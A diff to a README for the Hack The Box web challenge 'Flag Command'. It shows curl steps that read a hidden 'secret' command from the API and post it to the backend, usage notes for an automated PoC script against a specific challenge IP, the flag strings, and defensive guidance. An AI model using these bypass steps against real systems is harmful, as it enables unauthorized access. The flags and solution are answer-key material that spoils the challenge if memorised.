@@ -1,78 +1,56 @@
-# Flag Command
-
-## Overview
-
-This directory contains the local materials and manual walkthrough for the `Flag Command` challenge on Hack The Box. This is a web challenge built around a fake terminal adventure interface. The important weakness is that the frontend JavaScript exposes a hidden command path that the backend accepts directly.
-
-The challenge is a strong example of a common web-security lesson: values hidden in client-side code are not secrets.
+# Flag Command (Hack The Box) - Professional PoC Writeup
 
 ## Challenge Profile
 
-- Challenge: `Flag Command`
-- Category: `Web`
-- Platform: `Hack The Box`
+| Field | Value |
+|---|---|
+| Challenge | Flag Command |
+| Category | Web |
+| Vulnerability Class | Client-side trust boundary failure |
+| Weakness Pattern | Hidden command exposed to clients |
+| Primary endpoints | `GET /api/options`, `POST /api/monitor` |
 
-## Directory Contents
+## Scope And Ethics
 
-- `flag_command_poc.sh`
+This material is for authorized CTF infrastructure only. Do not run this PoC
+against systems you do not own or have explicit permission to test.
 
-## First Commands To Run
+## Technical Summary
 
-This folder does not include original challenge files. Follow the walkthrough the same way you would read a public writeup: understand the target behavior first, then reproduce each manual step against a fresh instance until the flag is visible.
+The challenge presents a terminal-style game where users appear to progress by
+issuing step-based commands. However, frontend JavaScript fetches all commands
+from `GET /api/options`, including a hidden `secret` command list. The backend
+directly accepts commands posted to `POST /api/monitor`, so the secret command
+can be submitted immediately to retrieve the flag.
 
-```bash
-cd "/home/eliah/Desktop/CTF/HackTheBox/Flag_Command"
-ls -lah
-printf 'Follow the manual walkthrough below against the live service.\n'
-```
+## Vulnerable Behavior
 
-## Writeup Flow
+1. Frontend code references `availableOptions['secret']`.
+2. API response from `/api/options` includes a hidden command string.
+3. Backend accepts that command without requiring normal game progression.
+4. Response message from `/api/monitor` returns `HTB{...}`.
 
-This README follows a public-writeup style structure: start from the provided files or exposed service, confirm the key weakness or clue with manual commands, use that confirmed finding to move forward, and stop only when the final flag or recovered result is visible.
+## Manual Verification Steps
 
-When you work through it, keep asking four questions:
-
-1. What is the challenge giving me locally or remotely?
-2. What exact behavior, bug, artifact, or hidden assumption matters?
-3. How do I verify that with a command or inspection step?
-4. How does that verified result lead to the final flag?
-
-## How The Application Works
-
-The user sees a browser-based terminal adventure where commands appear to unlock the next stage of the game. That presentation is misleading. The frontend is already fetching the full set of available commands from the backend, including a hidden `secret` command group.
-
-The critical point is that the browser JavaScript checks both:
-
-- the visible commands for the current step
-- the hidden commands under `secret`
-
-So a player who inspects the API or JavaScript can skip the intended flow entirely.
-
-## Manual Analysis Workflow
-
-First inspect the frontend code:
+1. Inspect frontend logic:
 
 ```bash
 curl -s "http://<HOST>:<PORT>/static/terminal/js/main.js"
 ```
 
-That reveals the application fetching:
+Look for logic equivalent to:
+`availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)`
 
-```text
-GET /api/options
-```
-
-and validating commands against both the normal path and a hidden `secret` path.
-
-Next, request the options directly:
+2. Enumerate backend command source:
 
 ```bash
 curl -s "http://<HOST>:<PORT>/api/options"
 ```
 
-In the response, the hidden command appears under the secret command list.
+The JSON includes:
+`allPossibleCommands.secret[0]`
 
-Finally, send that command directly to the backend:
+3. Submit the secret command directly:
 
 ```bash
 curl -s -X POST "http://<HOST>:<PORT>/api/monitor" \
@@ -80,38 +58,70 @@ curl -s -X POST "http://<HOST>:<PORT>/api/monitor" \
   -d '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
 ```
 
-The backend accepts it immediately and returns the flag.
+Expected signal:
+response `message` contains `HTB{...}`.
 
-## Why This Challenge Is Useful
+## Automated PoC
 
-This is a clean demonstration of why client-side secrets do not exist in any meaningful security sense. If the browser can fetch a value, then the user can fetch it too. If the JavaScript can see a hidden command, the attacker can see it as well.
+Script:
+`flag_command_poc.sh`
 
-The correct place to enforce sensitive logic is always on the server.
-
-## Optional Archive Reference
-
-The same result can be reached manually with this logic:
-
-1. requests `/api/options`
-2. extracts the first secret command from the JSON response
-3. sends that command to `/api/monitor`
-4. extracts the returned flag
-
-That mirrors the exact logic a manual solve would use, but without relying on a hardcoded hidden string.
-
-## Manual Reproduction Flow
-
-Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.
+### Usage
 
 ```bash
 cd "/home/eliah/Desktop/CTF/HackTheBox/Flag_Command"
-ls -lah
+chmod +x flag_command_poc.sh
+./flag_command_poc.sh <host> <port>
 ```
+
+### Common examples
+
+```bash
+./flag_command_poc.sh 154.57.164.79 31449
+./flag_command_poc.sh --host 154.57.164.79 --port 31449 --verbose
+./flag_command_poc.sh --host 154.57.164.79 --port 31449 --json
+./flag_command_poc.sh --host 154.57.164.79 --port 31449 --command "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
+```
+
+### Options
+
+- `--host <host>`: target host or IP.
+- `--port <port>`: target TCP port.
+- `--command <value>`: force a command value instead of auto-reading from API.
+- `--timeout <seconds>`: HTTP timeout, default `10`.
+- `--skip-check`: skip frontend behavior check.
+- `--json`: machine-readable JSON output.
+- `--verbose`: print debug details.
+- `-h`, `--help`: show usage help.
+
+### Exit codes
+
+- `0`: exploit succeeded and flag extracted.
+- `2`: invalid CLI arguments.
+- `3`: target connectivity failure.
+- `4`: `/api/options` request or parse failure.
+- `5`: secret command not found in API response.
+- `6`: exploit request succeeded but no `HTB{...}` token found.
+
+## Why The Exploit Works
+
+- Hidden functionality is delivered to untrusted clients.
+- Client-side checks are treated as security controls.
+- Backend does not enforce progression state before processing command input.
+
+## Defensive Guidance
+
+- Never treat client-hidden values as secrets.
+- Enforce command authorization and state transitions on the server.
+- Return only currently permitted commands from backend APIs.
+- Add server-side allowlists tied to authenticated session state.
+
+## Result Note
+
+Flag values are instance-specific. The format remains `HTB{...}`.
 
 ## Final Flag
 
-Following the manual path in this README leads to: `HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_a514b53e08c2e001d25041c95a2f7053}`
-
-## Study Notes
-
-This challenge is worth revisiting if you are practicing web-application inspection and client-side trust-boundary analysis. It is a useful example of how “hidden” functionality in JavaScript often becomes the actual attack surface.
+Target instance: `http://154.57.164.79:31449`  
+Solved on: `2026-04-02`  
+Flag: `HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_7730bc153c6352510ab3fab44c286ba6}`
